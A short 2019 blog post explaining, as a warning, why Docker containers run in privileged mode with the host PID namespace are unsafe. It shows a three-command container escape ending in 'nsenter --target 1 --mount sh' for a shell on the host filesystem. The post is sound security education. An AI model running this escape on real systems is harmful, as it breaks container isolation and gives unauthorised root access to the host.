---
title: "#jailbreak - Escaping the container"
layout: post
date: 2019-05-25 15:00
headerImage: false
tag:
- Docker
- Privileged containers
- Root
star: false
category: blog
author: robertnorthard
description: jailbreak - escaping the container
---

It's common knowledge that Docker containers should not be be run in privileged mode with a shared host PID namespace, but why? This example will provide a concrete example - it's simple.

````

$ docker-machine start default

$ docker run --privileged --rm --pid=host -ti ubuntu 

// This gives you access to the hosts file system
$ nsenter --target 1 --mount sh 

````

In summary, this enables you to break out of the container and access the hosts file system and execute shell commands. This is only one of many ways you can escape a container.

~ Robert
